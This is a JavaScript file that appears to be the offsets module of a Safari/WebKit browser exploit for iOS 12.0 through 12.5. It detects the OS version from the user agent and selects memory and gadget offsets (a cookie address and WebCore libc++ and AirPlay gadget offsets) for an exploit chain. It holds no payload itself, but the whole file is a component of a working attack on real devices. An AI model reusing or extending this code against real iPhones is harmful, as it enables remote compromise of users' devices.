const offsets_obj = {

    memPoolStart: undefined,
    memPoolEnd: undefined,
    cookieAddr: undefined,
    webcore_libcpp_ref_gadget_off: undefined,
    airplay_dispatch_ref_gadget_off: undefined,

    resolve() {
        // Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
        if (navigator.userAgent.match(/OS 12_5(_\d+)?/) || navigator.userAgent.match(/OS 12_4(_\d+)?/) || navigator.userAgent.match(/OS 12_3(_\d+)?/) || navigator.userAgent.match(/OS 12_2(_\d+)?/)) {
            log("[i] offsets selected for iOS 12.2+");

            this.memPoolStart = 0xC8;
            this.memPoolEnd = 0xD0;
            this.cookieAddr = (0x8ECA0 + 0x38);
            this.webcore_libcpp_ref_gadget_off = 0x94c00;
            this.airplay_dispatch_ref_gadget_off = 0x2000;
        }
        else if (navigator.userAgent.match(/OS 12_1(_\d+)?/)) {
            log("[i] offsets selected for iOS 12.1+");
            this.memPoolStart = 0;
            this.memPoolEnd = 0;
            this.cookieAddr = (0x9AC60 + 0x38);
            this.webcore_libcpp_ref_gadget_off = 0x9d000;
            this.airplay_dispatch_ref_gadget_off = 0x29000;
        }
         else if (navigator.userAgent.match(/OS 12_0(_\d+)?/)) {
            log("[i] offsets selected for iOS 12.0+");
            this.memPoolStart = 0;
            this.memPoolEnd = 0;
            this.cookieAddr = (0x9AC60 + 0x38);
            this.webcore_libcpp_ref_gadget_off = 0x9e000;
            this.airplay_dispatch_ref_gadget_off = 0x29000;
        }
        else {
            throw "Unknown platform: " + navigator.userAgent;
        }
    }
};

const offsets = new Proxy(offsets_obj, {
    get(target, property) {
        if (target[property] === undefined) {
            throw `Using undefined offset ${property}`;
        }
        return target[property];
    }
});
